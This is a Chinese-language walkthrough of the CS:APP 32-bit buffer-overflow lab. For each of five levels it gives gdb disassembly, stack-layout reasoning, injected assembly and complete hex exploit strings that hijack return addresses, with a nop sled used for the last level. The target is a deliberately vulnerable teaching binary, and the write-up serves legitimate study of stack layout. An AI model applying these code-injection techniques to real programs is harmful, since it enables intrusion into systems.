# Guide

## 知识储备

  1. lab2所拥有的C与汇编的知识
  2. 函数调用时内存上栈知识
  3. gdb 动态调试
  4. 编译链接等相关知识

## 题目

[官方文档](http://csapp.cs.cmu.edu/3e/buflab32.pdf)

利用buffer overflow 调用smoke (level 0), fizz (level 1), bang (level 2),boom (level 3), and kaboom (level 4).

`makecookie`是生成个人cookie的工具,使用方法`./makecookie <userid>`

`hex2raw`把16进制转换为对应的binary数据的工具

对于每一个得出的利用字串写在exploit.txt里,如果调用成功以下会输出正确的结果

`unix>cat exploit.txt | ./hex2raw | ./bufbomb -u <userid>`

## Solution

  `git diff default:lab3-buffer-32-bit finish:lab3-buffer-32-bit`

### smoke (level 0)

首先跟着官方文档看,生成我们自己的cookie

```
./makecookie cromarmot
0x7f9d2743
```

阅读getbuf函数

```
/*Buffer size for getbuf*/
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
  char buf[NORMAL_BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

官方文档也说 在输入在32个字符以内 不会有任何问题,一旦超过32个字符就会有buffer overflow的危险 但是并不一定就会发生 可能只是覆盖了某个不会影响运行的栈上的其它变量

```
> gdb bufbomb
(gdb) b getbuf
(gdb) r -u cromarmot
Breakpoint 1, 0x080491fa in getbuf ()
(gdb) disas
Dump of assembler code for function getbuf:
   0x080491f4 <+0>: push   %ebp
   0x080491f5 <+1>: mov    %esp,%ebp
   0x080491f7 <+3>: sub    $0x38,%esp
=> 0x080491fa <+6>: lea    -0x28(%ebp),%eax
   0x080491fd <+9>: mov    %eax,(%esp)
   0x08049200 <+12>:  call   0x8048cfa <Gets>
   0x08049205 <+17>:  mov    $0x1,%eax
   0x0804920a <+22>:  leave
   0x0804920b <+23>:  ret
End of assembler dump.

(gdb) disas smoke
Dump of assembler code for function smoke:
   0x08048c18 <+0>: push   %ebp
   0x08048c19 <+1>: mov    %esp,%ebp
   0x08048c1b <+3>: sub    $0x18,%esp
   0x08048c1e <+6>: movl   $0x804a4d3,(%esp)
   0x08048c25 <+13>:  call   0x80488c0 <puts@plt>
   0x08048c2a <+18>:  movl   $0x0,(%esp)
   0x08048c31 <+25>:  call   0x804937b <validate>
   0x08048c36 <+30>:  movl   $0x0,(%esp)
   0x08048c3d <+37>:  call   0x8048900 <exit@plt>
End of assembler dump.

```

根据堆栈知识和查询到的smoke入口地址`0x08048c18` 构建字符串**注意小端**

栈高地址

|return address|4(%ebp)|
|---|---|
|old ebp value|(%ebp)|
|...|...|
|string start|-0x28(%ebp) 通过<+6>发现|

栈低地址

`0x4-(-0x28)=44` 所以要`44`个字符以后才会覆盖`return address`

`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08`

> tip:如果你用的是vim那么可以在正常模式输入`44` 按`i`进入编辑模式,输入`00 `按两次`ESC`键盘 就可以得到44个00了

写入`exploit.ans0`

测试

```
cat exploit.ans0 | ./hex2raw | ./bufbomb -u cromarmot
Userid: cromarmot
Cookie: 0x7f9d2743
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

至此我们学会了基本的overflow 来制造函数跳转

### fizz (level 1)

```
(gdb) disas fizz
Dump of assembler code for function fizz:
   0x08048c42 <+0>: push   %ebp
   0x08048c43 <+1>: mov    %esp,%ebp
   0x08048c45 <+3>: sub    $0x18,%esp
   0x08048c48 <+6>: mov    0x8(%ebp),%eax
   0x08048c4b <+9>: cmp    0x804d108,%eax
   0x08048c51 <+15>:  jne    0x8048c79 <fizz+55>
   0x08048c53 <+17>:  mov    %eax,0x8(%esp)
   0x08048c57 <+21>:  movl   $0x804a4ee,0x4(%esp)
   0x08048c5f <+29>:  movl   $0x1,(%esp)
   0x08048c66 <+36>:  call   0x80489c0 <__printf_chk@plt>
```

呀哈？同样跳？注意在`__printf_chk@plt`前还有`cmp+jne`

关注`<+6>`和`<+9>`

说明被我们buffer overflow进去参数要是等于`0x804d108`地址上的值

```
(gdb)p/x *0x804d108
0x7f9d2743
```

得到的竟然是我们生成的cookie

回忆栈结构 esp指向的是堆栈顶(不是空单元)

相对于getbuf的栈指针 来说 ret返回以后

ebp指向old ebp

esp指向ebp

那么进入fizz以后`<+0>`和`<+1>`

ebp 指向了4+ebp


高

|解释|getbuf时候的指针|ret后|进入fizz<+3>|
|---|---|---|---|
|某个地址A|-|(%ebp)||
|我们应该放的要比较的值|0xc(%ebp)|-|8(%ebp) `<+6>`要读的值|
|-|8(%ebp)|(%esp)||
|return address|4(%ebp)|-|(%ebp) 并且这个位置将会存入我们overflow进去的地址A|
|old ebp value|(%ebp)|-||

低

所以应该填在0xc 位置

我们的字串格式为

`44个00 跳转地址 4个00 我们的cookie`

`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 43 27 9d 7f`

写入`exploit.ans1`

测试

```
cat exploit.ans1 | ./hex2raw | ./bufbomb -u cromarmot
Userid: cromarmot
Cookie: 0x7f9d2743
Type string:Fizz!: You called fizz(0x7f9d2743)
VALID
NICE JOB!
```

tips:当然 你可以直接越过cmp调到print前面地址`0x08048c53` 但做lab的目的是为了理清栈以及栈指针的变化,这种方法知道就好

至此我们学会了在跳转时传参

### bang (level 2)

```
(gdb) disass bang
Dump of assembler code for function bang:
   0x08048c9d <+0>: push   %ebp
   0x08048c9e <+1>: mov    %esp,%ebp
   0x08048ca0 <+3>: sub    $0x18,%esp
   0x08048ca3 <+6>: mov    0x804d100,%eax
   0x08048ca8 <+11>:  cmp    0x804d108,%eax
   0x08048cae <+17>:  jne    0x8048cd6 <bang+57>
```

`0x804d108`地址的值也就是cookie

那么我们要让`0x804d100`位置上的也等于cookie?

难道要overflow 到那里去？

回顾刚刚我们干的好事有

1. 改变返回地址
2. 改变函数所"接受的参数"

第一条也就是重新指定了函数入口

那我们就自己写"函数"让0x804d100 的值=我们的cookie 再进入bang(0x08048c9d)不就好了[对应下面的ans2.s代码]

注意RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。

所以编写`ans2.s`文件

```
movl $0x7f9d2743,0x804d100
pushl $0x08048c9d
ret
```

用`gcc -m32 -c ans2.s`编译为`ans2.o`

再用`objdump -d ans2.o`得到

```
   0: c7 04 25 00 d1 04 08  movl   $0x7f9d2743,0x804d100
   7: 43 27 9d 7f
   b: 68 9d 8c 04 08        push  $0x8048c9d
  10: c3                    ret
```

再次注意小端

`注入代码 空00前面一共44个  跳转到注入代码入口`

代码入口计算方法 在getbuf里设置断点 打出ebp的值，计算`ebp-0x28=0x55683598` 也就是我们输入的起始值

`c7 04 25 00 d1 04 08 43 27 9d 7f 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 35 68 55`

测试

```
cat exploit.ans2 | ./hex2raw | ./bufbomb -u cromarmot
Userid: cromarmot
Cookie: 0x7f9d2743
Type string:Bang!: You set global_value to 0x7f9d2743
VALID
NICE JOB!
```

至此我们学会了利用跳转+输入动态植入代码

才发现官方文档有指引我们`The code you place on the stack is called the exploit code. This style of attack is tricky, though, because you must get machine code onto the stack and set the return pointer to the start of this code _(:з」∠)_`

### boom (level 3)

根据官方文档 我们要做两件事
1. 返回我们的cookie
2. 让栈上的值不被发现变化

2怎么可能？又要注入代码又要 不被发现

当在调用前 getbuf所用的栈对于test()函数是未知的 返回以后test也就无法判断getbuf所用的栈是否有被corrupted 所以真正要维护的只有test时候所拥有的所有堆栈以及堆栈指针

根据我们前面的overflow经验 会影响到test有且只有 old ebp 那么

注意到test里的返回值是放在eax里

```
8048db9: e8 36 04 00 00        call   80491f4 <getbuf>
8048dbe: 89 c3                 mov    %eax,%ebx
```

  通过在getbuf的Gets前设置断点 得到old ebp的值

```
(gdb) b *0x80491fa
(gdb) r -u cromarmot
(gdb) x/wx $ebp
0x556835c0 <_reserved+1037760>: 0x556835f0
```

编写注入代码 eax设为cookie ebp设为0x556835f0  push返回地址 ret返回

```
movl $0x7f9d2743,%eax
movl $0x556835f0,%ebp
push $0x08048dbe
ret
```

`gcc+objdump`以后

```
   0: b8 43 27 9d 7f        mov    $0x7f9d2743,%eax
   5: bd f0 35 68 55        mov    $0x556835f0,%ebp
   a: 68 be 8d 04 08        push  $0x8048dbe
   f: c3                    ret
```

`b8 43 27 9d 7f bd f0 35 68 55 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 35 68 55`

测试

```
cat exploit.ans3 | ./hex2raw | ./bufbomb -u cromarmot
Userid: cromarmot
Cookie: 0x7f9d2743
Type string:Boom!: getbuf returned 0x7f9d2743
VALID
NICE JOB!
```

于是我们学会了偷偷默默注入了还“不被发现"

### kaboom (level 4)

啊 有没有感觉比bomblab 轻松多了 毕竟把汇编反看成c真是费力啊

注意这个需要加上`-n`参数运行

加了`-n`参数以后整个stack位置就不再像之前几个那样一直一样,这次不再是调用`getbuf`，而是调用`getbufn`,这个函数分配了512个空间

作者说执行的5次里你会发现%ebp 的变化±240，作为马克思主义熏陶下的青年我决定实事求是的测一测

在`getbufn`设断点 运行并`display $ebp`分别得到

`0x556835c0,0x55683550,0x556835d0,0x55683570,0x55683620`

根据汇编`-0x208(%ebp)`是输入开始的位置

所以共有的区域只有(高位省略) `0x620-0x208 ~ 0x550` 即 `0x418~0x550`

看testn里调用getbufn前的代码
```
 8048e29:	53                   	push   %ebx    #会影响esp哦
 8048e2a:	83 ec 24             	sub    $0x24,%esp
```

可以知道 old ebp = esp+0x24+0x4

所以结构是

`一共520个(填充nop 90 注入指令),oldebp空位,跳转地址到0x418`

```
leal 0x28(%esp),%ebp
movl $0x7f9d2743,%eax
pushl $0x08048e3a
ret
```

和前面一样用`gcc+objdump`获得机器码的十六进制

**注意！！！ gcc 编译记得加-m32 因为32和64下编译出来的lea不一样 只能得到segment fault 然后我在这个蛋疼的地方调了2+hours**

最后三行

```
90 b8 43 27 9d 7f 8d 6c
24 28 68 3a 8e 04 08 c3
00 00 00 00 18 34 68 55
```

验证

```
cat exploit.ans4 | ./hex2raw -n | ./bufbomb -n -u cromarmot
Userid: cromarmot
Cookie: 0x7f9d2743
Type string:KABOOM!: getbufn returned 0x7f9d2743
Keep going
Type string:KABOOM!: getbufn returned 0x7f9d2743
Keep going
Type string:KABOOM!: getbufn returned 0x7f9d2743
Keep going
Type string:KABOOM!: getbufn returned 0x7f9d2743
Keep going
Type string:KABOOM!: getbufn returned 0x7f9d2743
VALID
NICE JOB!
```


综上 我们对函数调用时栈有一定程度的熟悉了
